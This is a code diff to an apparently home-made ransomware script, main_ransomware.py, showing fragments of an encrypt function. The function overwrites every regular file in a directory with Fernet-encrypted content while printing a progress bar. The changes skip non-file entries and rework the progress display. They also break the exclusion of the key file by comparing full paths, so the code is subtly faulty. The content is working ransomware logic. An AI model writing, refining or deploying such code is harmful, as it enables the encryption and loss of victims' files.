@@ -30,6 +30,7 @@ def message():
 def encrypt(dir):
     content = os.listdir(dir)
     keys = []
+    file_number = len(content)
     for i in range(100):
         keys.append(Fernet.generate_key())
     
@@ -39,9 +40,13 @@ def encrypt(dir):
         f.write(key)
 
     for file_id in range(len(content)):
-        file_name = dir + "/" +content[file_id]
+        file_name = dir + "/" + content[file_id]
 
-        if content[file_id] == "key.key" or content[file_id] == "main_ransomware.py":
+        if file_name == "key.key" or file_name == "main_ransomware.py":
+            continue
+
+        if not os.path.isfile(file_name):
+            file_number -= 1
             continue
 
         with open(file_name, 'wb') as encrypted_file:
@@ -50,8 +55,8 @@ def encrypt(dir):
             encrypted_text = Fernet.encrypt(fernet, key)
             encrypted_file.write(encrypted_text) 
 
-        advancment = (100 * (file_id + 1)) / len(content)
-        print(f"[{file_id + 1}/{len(content)}]" + "[" + "#" * int(advancment / 10) + " " * (10 - int(advancment / 10)) + "]" , f"{advancment}%", f"Encrypting {file_name}...", end="\r")
+        advancment = (100 * (file_id + 1)) / file_number
+        print(f"[{file_id + 1}/{file_number}]" + "[" + "#" * int(advancment) + " " * (100 - int(advancment)) + "]" , f"{advancment}%", f"Encrypting {file_name}...", end="\r")
 
     print("\n")
     message()
